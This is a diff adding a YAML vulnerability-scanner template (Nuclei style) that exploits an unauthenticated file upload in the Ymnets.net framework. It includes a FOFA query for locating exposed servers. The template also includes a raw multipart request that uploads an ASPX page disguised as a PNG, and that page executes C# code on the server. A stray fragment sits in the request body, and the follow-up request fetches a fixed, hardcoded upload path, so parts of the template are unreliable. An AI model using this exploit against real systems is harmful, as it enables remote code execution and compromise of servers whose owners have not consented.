@@ -1,0 +1,75 @@
+id: poc-mkhutmkf9g5i10kw
+info:
+  name: Ymnets.net框架 upload文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mkhutmkf9g5i10kw'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mkhutmkf9g5i10kw
+    fofa: body="/Core/verify_code.ashx"
+http:
+- raw:
+  - 'POST /SysHelper/Upload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
+
+    Content-Length: 407
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu178FOm4XGgDZqeX
+
+
+    ------WebKitFormBoundaryu178FOm4XGgDZqeX
+
+    Content-Disposition: form-data; name="Filedata"; filename="2.aspx"
+
+    Content-Type: image/png
+
+
+    <%@Page Language="C#"%>
+
+    <%
+
+    Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
+
+    System.IO.File.Delete(Request.PhysicalPath);
+
+    %>
+
+    ------WebKitFormBoundaryu178FOm4XGgDZqeX--
+
+
+    上传定位：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /Uploads/202409231015126593466efbaa03993.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
